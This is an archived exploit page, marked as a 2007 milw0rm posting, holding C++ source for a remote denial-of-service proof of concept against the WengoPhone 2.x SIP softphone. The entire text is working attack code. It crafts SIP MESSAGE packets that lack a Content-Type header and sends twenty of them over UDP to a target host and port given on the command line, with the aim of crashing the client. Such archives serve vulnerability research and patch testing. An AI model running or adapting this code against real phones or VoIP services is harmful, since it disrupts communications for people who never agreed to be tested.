<html><head><title>WengoPhone 2.x SIP Phone Remote Denial of Service Exploit</title></head><pre>/**********main.cpp***********/
#include &lt;stdio.h&gt;
#include &lt;string&gt;
using namespace std;

#ifdef WIN32
#include &lt;winsock2.h&gt;
#pragma comment(lib, &quot;ws2_32.lib&quot;)
#define close closesocket
#define write(a,b,c) send(a, b, c, 0)
#define writeto(a,b,c,d,e) sendto(a, b, c, 0, d, e)
#define read(a,b,c) recv(a, b, c, 0)
#define readfrom(a,b,c,d,e) recvfrom(a, b, c, 0, d, e)
#else
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;
#define closesocket close
#define SOCKET int
#define DWORD unsigned long
#endif

char *craft_pkt =
       &quot;MESSAGE sip:[FROMUSER]@[DOMAIN] SIP/2.0\r\n&quot;
       &quot;Via: SIP/2.0/UDP [FROMADDR]:[LOCALPORT];branch=[BRANCH]\r\n&quot;
       &quot;From: [FROMUSER] &lt;sip:[FROMADDR]:[LOCALPORT]&gt;;tag=[TAG]\r\n&quot;
       &quot;To: &lt;sip:[TOADDR]&gt;\r\n&quot;
       &quot;Call-ID: [CALLID]@[DOMAIN]\r\n&quot;
       &quot;CSeq: [CSEQ] MESSAGE\r\n&quot;
       &quot;Contact: &lt;sip:[FROMUSER]@[DOMAIN]:[LOCALPORT]&gt;\r\n&quot;
       &quot;Content-Length: 0\r\n\r\n&quot;;

void socket_init()
{
#ifdef WIN32
       WSADATA wsaData;
       WSAStartup(MAKEWORD(2,0), &amp;wsaData);
#endif
}

unsigned long resolv(const char *host)
{
       struct hostent             *hp;
       unsigned long              host_ip;

       host_ip = inet_addr(host);
       if( host_ip == INADDR_NONE )
       {
               hp = gethostbyname(host);
               if(!hp)
               {
                       printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;,host);
                       exit(1);
               }
               else
                       host_ip = *(u_long*)hp-&gt;h_addr ;
       }

       return(host_ip);
}

SOCKET udpsocket()
{
       /* network */
       SOCKET sockfd;
       struct sockaddr_in laddr, raddr;

       sockfd = socket(AF_INET, SOCK_DGRAM, 0);
       if (sockfd == -1)
               goto error;

       memset((char *) &amp;laddr, 0, sizeof(laddr));
       laddr.sin_family = AF_INET;
       laddr.sin_addr.s_addr = htonl(INADDR_ANY);
       if (bind(sockfd, (struct sockaddr *) &amp;laddr, sizeof(laddr)) == -1)
               goto error;

       return sockfd;

error:
#ifdef WIN32
       printf(&quot;Error:%d\n&quot;, GetLastError());
#endif
       return 0;
}


string &amp;replace_all(string &amp;str,const string&amp; old_value,const string&amp; new_value)
{
       while(true)
       {
               string::size_type   pos(0);
               if(   (pos=str.find(old_value))!=string::npos)
                       str.replace(pos,old_value.length(),new_value);
               else   break;
       }
       return   str;
}

string &amp;replace_with_rand(string &amp;str, char *value, int len)
{
       char *strspace = &quot;0123456789&quot;;
       char randstr[100];
       for(int i=0; i&lt;len; i++)
       {
               do
               {
                       randstr[i] = strspace[rand()%strlen(strspace)];
               }while(randstr[i] == '0');
       }
       randstr[len] = 0;
       replace_all(str, value, randstr);
       return str;
}

string build_packet(string _packet, char *addr, char *host)
{
       string packet = _packet;
       replace_all(packet, &quot;[FROMADDR]&quot;, addr);
       replace_all(packet, &quot;[TOADDR]&quot;, host);
       replace_all(packet, &quot;[DOMAIN]&quot;, &quot;www.nosec.org&quot;);
       replace_all(packet, &quot;[FROMUSER]&quot;, &quot;siprint&quot;);
       replace_with_rand(packet, &quot;[CSEQ]&quot;, 9);
       replace_with_rand(packet, &quot;[CALLID]&quot;, 9);
       replace_with_rand(packet, &quot;[TAG]&quot;, 9);
       replace_with_rand(packet, &quot;[BRANCH]&quot;, 9);
       return packet;
}

int main(int argc, char **argv)
{
       char *host;
       int port;
       char *localip;
       struct sockaddr_in sockaddr;
       struct sockaddr_in raddr;
       int sockaddrlen = sizeof(sockaddr);
       SOCKET s;

       printf(&quot;WengoPhone 2.1 Missing Content-Type DOS PoC\n&quot;);

       if(argc != 4)
       {
               printf(&quot;usage : %s &lt;host&gt; &lt;port&gt; &lt;localip&gt;\n&quot;, argv[0]);
               exit(-1);
       }

       host = argv[1];
       port = atoi(argv[2]);
       localip = argv[3];

       socket_init();
       s = udpsocket();
       if(s == 0)
       {
               printf(&quot;Create udp socket error!\n&quot;, host, port);
               return 1;
       }
       memset(&amp;sockaddr, 0, sockaddrlen);
       getsockname(s, (struct sockaddr *) &amp;sockaddr, (int *) &amp;sockaddrlen);

       raddr.sin_family = AF_INET;
       raddr.sin_addr.S_un.S_addr = resolv(host);
       raddr.sin_port = htons(port);
       for(int i=0; i&lt;20; i++)
       {
               char portstr[6] = {'\0'};
               string packet = build_packet(craft_pkt, localip, host);
               sprintf(portstr, &quot;%d&quot;, ntohs(sockaddr.sin_port));
               replace_all(packet, &quot;[LOCALPORT]&quot;, portstr);
               //printf(&quot;===========\n%s\n===========\n&quot;, packet.c_str());
               writeto(s, packet.c_str(), packet.length(), (struct sockaddr*)&amp;raddr, sockaddrlen);
               Sleep(100);
       }

       return 0;
}

// milw0rm.com [2007-08-13]</pre></html>